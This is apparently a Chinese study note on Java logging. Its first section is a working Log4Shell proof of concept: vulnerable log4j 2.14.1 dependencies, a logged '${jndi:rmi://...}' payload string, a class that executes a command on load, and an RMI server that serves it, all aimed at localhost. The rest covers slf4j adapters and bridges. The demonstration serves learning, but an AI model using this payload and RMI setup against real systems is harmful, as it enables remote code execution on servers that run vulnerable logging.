### log4j漏洞演示

```xml
<!--使用log4j日志; <=2.14.1; >= 2.15.0修复-->
<dependency>
    <groupId>org.apache.logging.log4j</groupId>
    <artifactId>log4j-api</artifactId>
    <version>2.14.1</version>
</dependency>
<dependency>
    <groupId>org.apache.logging.log4j</groupId>
    <artifactId>log4j-core</artifactId>
    <version>2.14.1</version>
</dependency>
```

```xml
<!--log4j2.xml-->
<?xml version="1.0" encoding="UTF-8"?>
<Configuration status="WARN">
	<!--全局参数-->
	<Properties>
		<Property name="pattern">log4j2: %d{yyyy-MM-dd HH:mm:ss} %5p [%t] - %m%n</Property>
	</Properties>
	<Loggers>
		<Root level="INFO">
			<AppenderRef ref="console"/>
		</Root>
	</Loggers>
	<Appenders>
		<!-- 定义输出到控制台 -->
		<Console name="console" target="SYSTEM_OUT" follow="true">
			<!--控制台只输出level及以上级别的信息-->
			<ThresholdFilter level="INFO" onMatch="ACCEPT" onMismatch="DENY"/>
			<PatternLayout>
				<Pattern>${pattern}</Pattern>
			</PatternLayout>
		</Console>
	</Appenders>
</Configuration>
```

```properties
# log4j.properties
log4j.rootLogger=DEBUG, stdout
log4j.appender.stdout.Target = System.out
log4j.appender.stdout=org.apache.log4j.ConsoleAppender
log4j.appender.stdout.layout=org.apache.log4j.PatternLayout
log4j.appender.stdout.layout.ConversionPattern=%5p [%t] - %m%n
```

```java
package cn.qingweico;

import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;

/**
 * -Dlog4j2.formatMsgNoLookups=true
 * @author zqw
 * @date 2022/3/13
 */
public class LogTest {
    private static final Logger logger = LogManager.getLogger("log4j");
    public static void main(String[] args) {
        String username="${java:os}";
        logger.info("Hello, {}",username);
    }
}

```

```xml
<!--使用slf4j日志-->
<!--slf4j适配log4j2-->
<dependency>
    <groupId>org.apache.logging.log4j</groupId>
    <artifactId>log4j-slf4j-impl</artifactId>
    <version>2.12.1</version>
</dependency>
```

```java
package cn.qingweico;

import org.slf4j.Logger;
import org.slf4j.LoggerFactory;

/**
 * @author zqw
 * @date 2022/3/13
 */
public class LogTest {
    private static final Logger logger = LoggerFactory.getLogger("slf4j");
    public static void main(String[] args) {
        String username="${jndi:rmi://127.0.0.1:8080/lookup}";
        logger.info("Hello, {}",username);
    }
}
```

```java
package cn.qingweico;

import java.io.IOException;

/**
 * @author zqw
 * @date 2022/3/13
 */
public class Look {
   static {
      try {
         Runtime.getRuntime().exec("calc");
      } catch (IOException e) {
         e.printStackTrace();
      }
   }
}
```

```java
package cn.qingweico;


import com.sun.jndi.rmi.registry.ReferenceWrapper;

import javax.naming.NamingException;
import javax.naming.Reference;
import java.rmi.AlreadyBoundException;
import java.rmi.RemoteException;
import java.rmi.registry.LocateRegistry;
import java.rmi.registry.Registry;

/**
 * @author zqw
 * @date 2022/3/13
 */
public class RmiServer {
   public static void main(String[] args) throws NamingException, RemoteException, AlreadyBoundException {
      Registry registry = LocateRegistry.createRegistry(8080);
      registry.bind("lookup", new ReferenceWrapper(new Reference(
              null, "cn.qingweico.Look", null
      )));
   }
}
```

### 日志适配和桥接

```xml
<!--jcl -->
<dependency>
    <groupId>commons-logging</groupId>
    <artifactId>commons-logging</artifactId>
    <version>1.2</version>
</dependency>
<!--log4j-->
<dependency>
    <groupId>log4j</groupId>
    <artifactId>log4j</artifactId>
    <version>1.2.17</version>
</dependency>
<!--slf4j -->
<dependency>
    <groupId>org.slf4j</groupId>
    <artifactId>slf4j-api</artifactId>
    <version>1.7.25</version>
</dependency>
```

```xml
<!--slf4j适配log4j1.x -->
<dependency>
    <groupId>org.slf4j</groupId>
    <artifactId>slf4j-log4j12</artifactId>
    <version>1.7.25</version>
</dependency>
<!--slf4j适配log4j2-->
<dependency>
    <groupId>org.apache.logging.log4j</groupId>
    <artifactId>log4j-slf4j-impl</artifactId>
    <version>2.12.1</version>
</dependency>
<!--slf4j适配jcl-->
<dependency>
    <groupId>org.slf4j</groupId>
    <artifactId>slf4j-jcl</artifactId>
    <version>1.7.25</version>
</dependency>
<!--log4j 桥接到 slf4j-->
<dependency>
    <groupId>org.slf4j</groupId>
    <artifactId>log4j-over-slf4j</artifactId>
    <version>1.7.25</version>
</dependency>
```

| 名称              | jar包                                         | 描述                             |
| ----------------- | --------------------------------------------- | -------------------------------- |
| log4j             | log4j-xxx.jar                                 | 早期常用日志组件                 |
| logback           | logback-core、logback-classic、logback-access | 一套日志组件的实现 性能优于log4j |
| log4j2            | log4j、log4-api 、log4j-core                  | apache 开发的一款log4j的升级产品 |
| java.util.logging | jdk                                           | Java 1.4 以来的官方日志实现      |

适配器

![Java日志 (1)](https://cdn.qingweico.cn/blog/Java%E6%97%A5%E5%BF%97%20(1).png)

桥接器

![Java日志](https://cdn.qingweico.cn/blog/Java%E6%97%A5%E5%BF%97.png)